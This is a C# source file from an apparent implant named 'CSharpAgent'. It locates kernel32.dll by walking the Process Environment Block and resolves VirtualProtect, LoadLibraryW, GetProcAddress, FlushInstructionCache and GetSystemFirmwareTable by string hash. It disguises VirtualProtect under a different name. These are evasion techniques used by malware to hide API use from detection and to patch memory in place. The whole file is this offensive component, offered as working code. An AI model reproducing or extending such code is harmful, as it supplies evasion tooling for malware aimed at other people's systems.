using System;
using System.Runtime.InteropServices;

namespace CSharpAgent
{
    internal class Kernel32
    {
        public delegate bool ChangeMemoryProtectionDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string lpProcName);
        public delegate bool FlushInstructionCacheDelegate(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
        public delegate uint GetSystemFirmwareTableDelegate(uint firmwareTableProviderSignature, uint firmwareTableID, byte[] firmwareTableBuffer, uint size);  
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public delegate IntPtr LoadLibraryWDelegate(string lpLibFileName);
        public delegate void GetNativeSystemInfoDelegate(ref SYSTEM_INFO lpSystemInfo);

        // Read-only fields ensure immutability and prevent accidental overwriting
        public readonly ChangeMemoryProtectionDelegate ChangeMemoryProtection;
        public readonly GetProcAddressDelegate GetProcAddress;
        public readonly FlushInstructionCacheDelegate FlushInstructionCache;
        public readonly GetSystemFirmwareTableDelegate GetSystemFirmwareTable;
        public readonly LoadLibraryWDelegate LoadLibraryW;
        public readonly GetNativeSystemInfoDelegate GetNativeSystemInfo;
        public readonly IntPtr ModuleHandle;

        private static Kernel32 cachedKernel;

        private Kernel32(
            IntPtr moduleHandle,
            ChangeMemoryProtectionDelegate changeMemoryProtection,
            GetProcAddressDelegate getProcAddress,
            FlushInstructionCacheDelegate flushInstructionCache,
            GetSystemFirmwareTableDelegate getSystemFirmwareTable,
            LoadLibraryWDelegate loadLibraryW,
            GetNativeSystemInfoDelegate getNativeSystemInfo)
        {
            ModuleHandle = moduleHandle;
            ChangeMemoryProtection = changeMemoryProtection;
            GetProcAddress = getProcAddress;
            FlushInstructionCache = flushInstructionCache;
            GetSystemFirmwareTable = getSystemFirmwareTable;
            LoadLibraryW = loadLibraryW;
            GetNativeSystemInfo = getNativeSystemInfo;
        }

        /// <summary>
        /// Atomically resolves module and exports using the Factory Pattern.
        /// Fully compatible with .NET Framework 2.0+ via non-generic marshalling.
        /// </summary>
        public static bool TryCreateKernel32(out Kernel32 instance)
        {
            if (cachedKernel != null)
            {
                instance = cachedKernel;
                return true;
            }

            instance = null;

            IntPtr moduleHandle = PebWalker.ResolveModuleFromPeb("kernel32.dll");
            if (moduleHandle == IntPtr.Zero)
            {
                return false;
            }

            IntPtr ptrVirtualProtect           = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("VirtualProtect"));
            IntPtr ptrGetProcAddress           = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("GetProcAddress"));
            IntPtr ptrFlushInstructionCache  = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("FlushInstructionCache"));
            IntPtr ptrGetSystemFirmwareTable = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("GetSystemFirmwareTable"));
            IntPtr ptrLoadLibraryW             = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("LoadLibraryW"));
            IntPtr ptrGetNativeSystemInfo    = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("GetNativeSystemInfo"));

            if (ptrVirtualProtect == IntPtr.Zero || 
                ptrGetProcAddress == IntPtr.Zero || 
                ptrFlushInstructionCache == IntPtr.Zero ||
                ptrGetSystemFirmwareTable == IntPtr.Zero ||
                ptrLoadLibraryW == IntPtr.Zero ||
                ptrGetNativeSystemInfo == IntPtr.Zero)
            {
                return false;
            }

            var changeMemoryProtection = (ChangeMemoryProtectionDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrVirtualProtect, typeof(ChangeMemoryProtectionDelegate));
            var getProcAddress = (GetProcAddressDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrGetProcAddress, typeof(GetProcAddressDelegate));
            var flushInstructionCache = (FlushInstructionCacheDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrFlushInstructionCache, typeof(FlushInstructionCacheDelegate));
            var getSystemFirmwareTable = (GetSystemFirmwareTableDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrGetSystemFirmwareTable, typeof(GetSystemFirmwareTableDelegate));
            var loadLibraryW = (LoadLibraryWDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrLoadLibraryW, typeof(LoadLibraryWDelegate));
            var getNativeSystemInfo = (GetNativeSystemInfoDelegate)Marshal.GetDelegateForFunctionPointer(
                ptrGetNativeSystemInfo, typeof(GetNativeSystemInfoDelegate));

            cachedKernel = new Kernel32(
                moduleHandle,
                changeMemoryProtection,
                getProcAddress,
                flushInstructionCache,
                getSystemFirmwareTable,
                loadLibraryW,
                getNativeSystemInfo
            );

            instance = cachedKernel;
            return true;
        }
    }
}